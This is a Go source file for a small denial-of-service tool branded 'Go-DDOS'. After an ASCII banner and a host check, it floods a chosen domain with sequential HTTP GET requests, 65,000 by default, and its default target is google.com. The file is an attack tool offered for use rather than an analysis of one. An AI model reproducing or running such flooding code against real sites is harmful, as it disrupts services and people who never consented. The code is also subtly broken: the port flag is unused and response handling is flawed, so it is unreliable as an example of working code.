package main
import (
"fmt"
"net/http"
"flag"
"log"
"time"
"os"

)
type Ddos struct{
ip string
port string
requests int
} 
func Banner(){
        banner_print := `
 @@@@@@@   @@@@@@           @@@@@@@  @@@@@@@   @@@@@@   @@@@@@ 
!@@       @@!  @@@          @@!  @@@ @@!  @@@ @@!  @@@ !@@     
!@! @!@!@ @!@  !@! @!@!@!@! @!@  !@! @!@  !@! @!@  !@!  !@@!!  
:!!   !!: !!:  !!!          !!:  !!! !!:  !!! !!:  !!!     !:! 
 :: :: :   : :. :           :: :  :  :: :  :   : :. :  ::.: :  
`
fmt.Println(banner_print)
time.Sleep(1)
fmt.Println("Made By FonderElite | Github: https://github.com/FonderElite")
}
func Request(ipadd string) *Ddos{
ip_a := Ddos{ip: ipadd}
req,err := http.Get("http://" + ipadd)
if err != nil{
fmt.Println("Try.")
}else{
fmt.Println("[!]Checking if the host is up..." )
if req.StatusCode == 200 && req.StatusCode != 400{
time.Sleep(1 * time.Second)
fmt.Printf("[%v]Success Status-code.\n",req.StatusCode)
}else{
fmt.Printf("[%v]Host Seems down.",req.StatusCode)
fmt.Println("Terminating Go Program...")
time.Sleep(1 * time.Second)
os.Exit(1)
}
}
defer req.Body.Close()
return &ip_a
}
func MalBytes(site string,port string,request int)*Ddos{
ip_ac := Ddos{ip: site,port: port,requests: request}
fmt.Printf("Sending Total of %v requests to %v\n",ip_ac.requests,ip_ac.ip)
time.Sleep(2 * time.Second)
for i:=0; i < ip_ac.requests; i++{
        flood,err := http.Get("http://" + ip_ac.ip)
if err != nil{
        log.Fatal(err)
}
fmt.Printf("[%v]Request-> %v\n",flood.StatusCode,ip_ac.ip)
}
return &ip_ac
}
func main(){
first_arg :=  flag.String("domain", "google.com", "Domain Name")
second_arg := flag.String("port", "80", "Port to connect")
third_arg := flag.Int("requests",65000,"Number of requests to send.")
flag.Parse()
Banner()
fmt.Printf("Time Start: %v\n",time.Now())
Request(*first_arg)
MalBytes(*first_arg,*second_arg,*third_arg)
}
